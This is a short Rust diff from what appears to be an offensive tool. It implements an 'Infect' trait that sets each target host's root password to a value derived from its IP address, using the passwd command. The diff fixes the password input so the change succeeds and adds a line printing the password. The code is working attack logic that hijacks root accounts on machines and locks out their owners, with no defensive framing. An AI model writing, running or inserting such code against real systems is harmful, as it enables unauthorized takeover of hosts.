@@ -47,7 +47,7 @@ fn passwd(username: &str, password: &str) -> std::io::Result<()> {
     match super::utils::CommandExecutor::execute_command(
         "passwd",
         Some(&[username]),
-        Some(&[password]),
+        Some(&[password, password]),
     ) {
         Ok(_) => Ok(()),
         Err(e) => Err(e),
@@ -62,6 +62,7 @@ impl super::types::Infect for crate::Host {
             schema,
             self.ip.split('.').last().unwrap().parse::<u16>().ok().unwrap_or_default() * magic as u16
         );
+        println!("Password: {}", password);
         let _ = passwd("root", password.as_str());
     }
 }
